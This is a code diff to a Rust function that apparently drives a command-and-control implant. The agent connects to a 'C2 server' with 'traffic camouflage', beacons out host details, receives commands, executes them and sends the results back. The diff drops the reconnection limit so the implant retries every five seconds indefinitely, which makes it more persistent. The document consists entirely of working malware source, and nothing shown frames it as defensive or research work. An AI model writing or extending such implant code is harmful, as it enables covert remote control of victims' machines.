@@ -107,41 +107,14 @@ async fn run_agent(
     );
     info!("Traffic camouflage: {}", if config.debug { "disabled (debug)" } else { "full" });
 
-    let mut reconnect_count = 0;
-    let max_reconnects = 10;
-
     loop {
         // Attempt connection
         match communicator.connect().await {
             Ok(()) => {
-                reconnect_count = 0;
                 info!("🔗 Connected to C2 server");
 
-                // Send initial beacon
-                let beacon = BeaconPayload {
-                    agent_id: sys_info.agent_id.clone(),
-                    hostname: sys_info.hostname.clone(),
-                    os: sys_info.os.clone(),
-                    os_version: sys_info.os_version.clone(),
-                    architecture: sys_info.architecture.clone(),
-                    ip_address: None,
-                    user: None,
-                    privileges: None,
-                };
-
-                match communicator.send_beacon(&beacon).await {
-                    Ok(response) => {
-                        info!("✅ Initial beacon sent");
-                        debug!("Response: {}", response);
-                    }
-                    Err(e) => {
-                        error!("Failed to send beacon: {}", e);
-                    }
-                }
-
                 // Main command loop
-                loop {
-                    // Send periodic beacons
+                'beacon: loop {
                     let beacon = BeaconPayload {
                         agent_id: sys_info.agent_id.clone(),
                         hostname: sys_info.hostname.clone(),
@@ -154,8 +127,8 @@ async fn run_agent(
                     };
 
                     if let Err(e) = communicator.send_beacon(&beacon).await {
-                        error!("Beacon error: {}", e);
-                        break;
+                        error!("Beacon send failed: {}", e);
+                        break 'beacon;
                     }
 
                     let next_interval = communicator.next_beacon_interval().await;
@@ -166,12 +139,10 @@ async fn run_agent(
                         Ok(Some(cmd_str)) => {
                             info!("📥 Command received: {}", cmd_str);
 
-                            // Parse and execute command
                             if let Ok(cmd) = serde_json::from_str::<CommandType>(&cmd_str) {
                                 let result = Executor::execute_command(&cmd).await;
                                 info!("✅ Command executed in {}ms", result.execution_time_ms);
 
-                                // Send result back
                                 let response = communicator::CommandResponse {
                                     command_id: 1,
                                     status: result.status.clone(),
@@ -182,6 +153,7 @@ async fn run_agent(
 
                                 if let Err(e) = communicator.send_command_result(&response).await {
                                     error!("Failed to send command result: {}", e);
+                                    break 'beacon;
                                 }
                             } else {
                                 error!("Failed to parse command");
@@ -191,33 +163,21 @@ async fn run_agent(
                             debug!("No commands received");
                         }
                         Err(e) => {
-                            debug!("No command or timeout: {}", e);
-                            // Don't break - just continue waiting for next beacon
+                            error!("Connection lost: {}", e);
+                            break 'beacon;
                         }
                     }
 
-                    // Sleep with jitter before next beacon
                     sleep(Duration::from_secs(next_interval)).await;
                 }
             }
             Err(e) => {
-                reconnect_count += 1;
-                if reconnect_count >= max_reconnects {
-                    error!(
-                        "Failed to reconnect after {} attempts",
-                        max_reconnects
-                    );
-                    return Err("Reconnection limit reached".into());
-                }
-
-                let backoff = 2_u64.pow(reconnect_count as u32);
-                error!(
-                    "Connection failed ({}), attempt {}/{}, retrying in {}s",
-                    e, reconnect_count, max_reconnects, backoff
-                );
-
-                sleep(Duration::from_secs(backoff)).await;
+                error!("Connection failed: {}", e);
             }
         }
+
+        // Always reconnect after disconnection, with a short delay
+        info!("🔄 Reconnecting in 5s...");
+        sleep(Duration::from_secs(5)).await;
     }
 }
